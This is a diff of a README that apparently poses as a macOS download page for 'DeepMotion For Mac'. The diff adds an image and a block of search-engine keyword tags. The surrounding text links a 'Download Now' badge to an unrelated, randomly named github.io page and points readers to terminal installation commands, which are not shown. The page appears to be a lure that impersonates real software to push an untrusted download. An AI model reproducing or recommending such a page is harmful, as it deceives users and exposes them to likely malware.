@@ -2,6 +2,8 @@
 
 DeepMotion For Mac is a powerful and intuitive motion graphics and animation software designed exclusively for macOS users. Create stunning animations, dynamic visual effects, and seamless video transitions with ease. Follow the instructions below to install DeepMotion For Mac and unlock a world of creative possibilities.
 
+![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMuM0jIQEEKv7Opnctm8Ik0KoCabuNzHA6A&s)
+
 [![Download Now](https://img.shields.io/badge/Download-Now-%23007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/deepmotion)
 
 If the download button above doesn’t work, follow the manual installation instructions below using the terminal.
@@ -75,3 +77,4 @@ For those searching for a free animation software for Mac, DeepMotion For Mac of
 
 ## 🔍 Tags
 
+deepmotion animate 3d, deep motion ai, deepmotion ai, deepmotion alternative, deepmotion download, deepmotion animate 3d free download, deepmotion free, deep motion, animation 3d, deepmotion pricing, deepmotion app, deepmotion ai app
